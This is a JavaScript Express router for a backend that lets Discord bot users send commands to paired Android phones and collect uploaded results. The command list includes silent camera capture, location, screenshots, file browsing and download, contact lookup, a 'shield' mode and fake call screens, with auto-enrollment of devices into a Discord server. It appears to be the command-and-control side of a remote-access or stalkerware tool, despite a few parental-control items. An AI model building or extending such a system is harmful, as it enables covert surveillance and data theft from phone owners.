const express = require('express');
const multer = require('multer');
const path = require('path');
const { z } = require('zod');
const { generateId } = require('../utils/random');

const DEVICE_COMMANDS = new Set([
  'apps',
  'open',
  'lock',
  'say',
  'sayurdu',
  'playaudio',
  'stopaudio',
  'pauseaudio',
  'resumeaudio',
  'audiostatus',
  'parentpin',
  'shield',
  'screenshot',
  'files',
  'filestat',
  'mkdir',
  'rename',
  'move',
  'delete',
  'uploadfile',
  'readtext',
  'download',
  'volume',
  'info',
  'permstatus',
  'location',
  'camerasnap',
  'contactlookup',
  'smsdraft',
  'fileshareintent',
  'quicklaunch',
  'torchpattern',
  'ringtoneprofile',
  'screentimeoutset',
  'mediacontrol',
  'randomquote',
  'fakecallui',
  'shakealert',
  'vibratepattern',
  'beep',
  'countdownoverlay',
  'flashtext',
  'coinflip',
  'diceroll',
  'randomnumber',
  'quicktimer',
  'soundfx',
  'prankscreen',
  'show',
  'message',
  'lockapp',
  'unlockapp',
  'lockedapps',
  'usage',
  'wallpaper',
  'silentcapture',
]);

function createApiRouter({ store, hub, config, botAuth, deviceAuth, guildAdminAuth }) {
  const router = express.Router();

  const upload = multer({
    storage: multer.diskStorage({
      destination: (_req, _file, cb) => cb(null, config.mediaDir),
      filename: (_req, file, cb) => {
        const ext = path.extname(file.originalname || '').replace(/[^a-zA-Z0-9.]/g, '');
        cb(null, `${generateId()}${ext || '.bin'}`);
      },
    }),
    limits: {
      fileSize: config.maxUploadBytes,
    },
  });

  router.get('/health', (_req, res) => {
    res.json({
      status: 'ok',
      ts: Date.now(),
      onlineDevices: hub.deviceSockets.size,
      botSubscribers: hub.botSockets.size,
    });
  });

  router.get('/capabilities', (_req, res) => {
    const commands = Array.from(DEVICE_COMMANDS).sort();
    res.json({
      backendVersion: config.backendVersion,
      backendBuildTs: config.backendBuildTs,
      commandCount: commands.length,
      commands,
    });
  });

  router.post('/pairing/code', (req, res) => {
    const schema = z.object({
      deviceId: z.string().min(3),
      deviceToken: z.string().optional(),
      enrollmentToken: z.string().optional(),
      name: z.string().optional(),
      model: z.string().optional(),
      androidVersion: z.string().optional(),
      appVersion: z.string().optional(),
    });

    const parsed = schema.safeParse(req.body || {});
    if (!parsed.success) {
      return res.status(400).json({ error: 'INVALID_REQUEST', details: parsed.error.flatten() });
    }

    try {
      const registration = store.registerOrRefreshDevice(parsed.data);
      const pairing = store.createPairingCode(parsed.data.deviceId);

      let autoEnrolled = false;
      let autoEnrollBound = false;
      if (parsed.data.enrollmentToken) {
        if (!config.autoEnrollToken || !config.autoEnrollGuildId) {
          return res.status(400).json({ error: 'AUTO_ENROLL_DISABLED' });
        }
        if (parsed.data.enrollmentToken !== config.autoEnrollToken) {
          return res.status(401).json({ error: 'AUTO_ENROLL_TOKEN_INVALID' });
        }

        const actorUserId = config.ownerDiscordUserId || 'auto-enroll';
        store.attachDeviceToGuild({
          guildId: config.autoEnrollGuildId,
          deviceId: parsed.data.deviceId,
          actorUserId,
          source: 'auto_enroll_token',
        });
        autoEnrolled = true;

        if (config.autoEnrollBindChannel && config.autoEnrollChannelId) {
          store.bindChannel({
            guildId: config.autoEnrollGuildId,
            channelId: config.autoEnrollChannelId,
            deviceId: parsed.data.deviceId,
            actorUserId,
          });
          autoEnrollBound = true;
        }

        if (config.autoEnrollChannelId) {
          hub.fanout({
            type: 'bot.device_event',
            eventType: 'auto_enrolled',
            deviceId: parsed.data.deviceId,
            channelId: config.autoEnrollChannelId,
            data: {
              guildId: config.autoEnrollGuildId,
              channelId: config.autoEnrollChannelId,
              boundToChannel: autoEnrollBound,
              model: parsed.data.model || null,
              androidVersion: parsed.data.androidVersion || null,
              appVersion: parsed.data.appVersion || null,
            },
            ts: Date.now(),
          });
        }
      }

      return res.json({
        deviceId: parsed.data.deviceId,
        deviceToken: registration.token,
        pairCode: pairing.code,
        expiresAt: pairing.expiresAt,
        autoEnrolled,
        autoEnrollGuildId: autoEnrolled ? config.autoEnrollGuildId : null,
        autoEnrollChannelId: autoEnrolled ? (config.autoEnrollChannelId || null) : null,
        autoEnrollBound,
      });
    } catch (err) {
      return res.status(401).json({ error: err.message || 'PAIRING_FAILED' });
    }
  });

  router.post('/pairing/claim', botAuth, (req, res) => {
    const schema = z.object({
      code: z.string().min(4),
      guildId: z.string().min(2),
      channelId: z.string().min(2),
      discordUserId: z.string().min(2),
    });

    const parsed = schema.safeParse(req.body || {});
    if (!parsed.success) {
      return res.status(400).json({ error: 'INVALID_REQUEST', details: parsed.error.flatten() });
    }

    const data = parsed.data;

    // First pairing can be done by the owner user configured in env.
    if (!store.ensureGuildAdmin(data.guildId, data.discordUserId)) {
      if (!(config.ownerDiscordUserId && config.ownerDiscordUserId === data.discordUserId)) {
        return res.status(403).json({ error: 'DISCORD_USER_NOT_AUTHORIZED' });
      }
    }

    try {
      const result = store.claimPairingCode(data);
      return res.json({ success: true, ...result });
    } catch (err) {
      return res.status(400).json({ error: err.message || 'PAIRING_CLAIM_FAILED' });
    }
  });

  router.post('/commands', botAuth, guildAdminAuth, (req, res) => {
    const schema = z.object({
      requestId: z.string().optional(),
      guildId: z.string().min(2),
      channelId: z.string().min(2),
      discordUserId: z.string().min(2),
      commandName: z.string().min(2),
      payload: z.record(z.any()).optional(),
    });

    const parsed = schema.safeParse(req.body || {});
    if (!parsed.success) {
      return res.status(400).json({ error: 'INVALID_REQUEST', details: parsed.error.flatten() });
    }

    const data = parsed.data;
    const commandName = data.commandName.toLowerCase();
    if (!DEVICE_COMMANDS.has(commandName)) {
      return res.status(400).json({
        error: 'UNKNOWN_COMMAND',
        details: {
          commandName,
          hint: 'backend_outdated_or_not_synced',
          supportedCommandCount: DEVICE_COMMANDS.size,
        },
      });
    }

    const binding = store.getBoundDevice({ guildId: data.guildId, channelId: data.channelId });
    if (!binding) {
      return res.status(400).json({ error: 'CHANNEL_NOT_BOUND' });
    }

    const command = store.createCommand({
      guildId: data.guildId,
      channelId: data.channelId,
      discordUserId: data.discordUserId,
      deviceId: binding.device_id,
      commandName,
      payload: data.payload || {},
      requestId: data.requestId || generateId(),
    });

    const dispatched = hub.dispatchCommand(command);
    return res.status(202).json({
      commandId: command.id,
      requestId: command.requestId,
      deviceId: command.deviceId,
      status: dispatched ? 'dispatched' : 'queued',
    });
  });

  router.post('/commands/:id/media', deviceAuth, upload.single('file'), (req, res) => {
    if (!req.file) {
      return res.status(400).json({ error: 'FILE_REQUIRED' });
    }

    const commandId = req.params.id;
    if (!store.verifyCommandBelongsToDevice(commandId, req.deviceId)) {
      return res.status(403).json({ error: 'COMMAND_NOT_OWNED_BY_DEVICE' });
    }

    try {
      const saved = store.saveMediaForCommand({
        commandId,
        fileName: req.file.originalname || req.file.filename,
        mimeType: req.file.mimetype || 'application/octet-stream',
        filePath: req.file.path,
        fileSize: req.file.size,
      });

      return res.json({ mediaId: saved.mediaId });
    } catch (err) {
      return res.status(400).json({ error: err.message || 'MEDIA_SAVE_FAILED' });
    }
  });

  router.get('/media/:mediaId', botAuth, (req, res) => {
    const row = store.getMediaById(req.params.mediaId);
    if (!row) {
      return res.status(404).json({ error: 'MEDIA_NOT_FOUND' });
    }

    return res.type(row.mime_type).sendFile(path.resolve(row.file_path));
  });

  router.post('/admins', botAuth, guildAdminAuth, (req, res) => {
    const schema = z.object({
      guildId: z.string().min(2),
      actorUserId: z.string().min(2),
      targetUserId: z.string().min(2),
    });

    const parsed = schema.safeParse(req.body || {});
    if (!parsed.success) {
      return res.status(400).json({ error: 'INVALID_REQUEST', details: parsed.error.flatten() });
    }

    store.addGuildAdmin(parsed.data);
    return res.json({ success: true });
  });

  router.delete('/admins/:userId', botAuth, (req, res, next) => {
    req.body = req.body || {};
    req.body.targetUserId = req.params.userId;
    return next();
  }, guildAdminAuth, (req, res) => {
    const schema = z.object({
      guildId: z.string().min(2),
      actorUserId: z.string().min(2),
      targetUserId: z.string().min(2),
    });

    const parsed = schema.safeParse(req.body || {});
    if (!parsed.success) {
      return res.status(400).json({ error: 'INVALID_REQUEST', details: parsed.error.flatten() });
    }

    store.removeGuildAdmin(parsed.data);
    return res.json({ success: true });
  });

  router.post('/channel-bindings', botAuth, guildAdminAuth, (req, res) => {
    const schema = z.object({
      guildId: z.string().min(2),
      channelId: z.string().min(2),
      deviceId: z.string().min(3),
      actorUserId: z.string().min(2),
    });

    const parsed = schema.safeParse(req.body || {});
    if (!parsed.success) {
      return res.status(400).json({ error: 'INVALID_REQUEST', details: parsed.error.flatten() });
    }

    try {
      store.bindChannel(parsed.data);
      return res.json({ success: true });
    } catch (err) {
      return res.status(404).json({ error: err.message || 'BINDING_FAILED' });
    }
  });

  router.delete('/channel-bindings/:channelId', botAuth, (req, res, next) => {
    req.body = req.body || {};
    req.body.channelId = req.params.channelId;
    return next();
  }, guildAdminAuth, (req, res) => {
    const schema = z.object({
      guildId: z.string().min(2),
      channelId: z.string().min(2),
      actorUserId: z.string().min(2),
    });

    const parsed = schema.safeParse(req.body || {});
    if (!parsed.success) {
      return res.status(400).json({ error: 'INVALID_REQUEST', details: parsed.error.flatten() });
    }

    store.unbindChannel(parsed.data);
    return res.json({ success: true });
  });

  router.get('/devices', botAuth, (req, res) => {
    const guildId = req.query.guildId;
    const discordUserId = req.query.discordUserId;

    if (!guildId || !discordUserId) {
      return res.status(400).json({ error: 'GUILD_OR_USER_MISSING' });
    }

    if (!store.ensureGuildAdmin(guildId, discordUserId)) {
      return res.status(403).json({ error: 'DISCORD_USER_NOT_AUTHORIZED' });
    }

    return res.json({ devices: store.listDevicesForGuild(guildId) });
  });

  return router;
}

module.exports = { createApiRouter, DEVICE_COMMANDS };
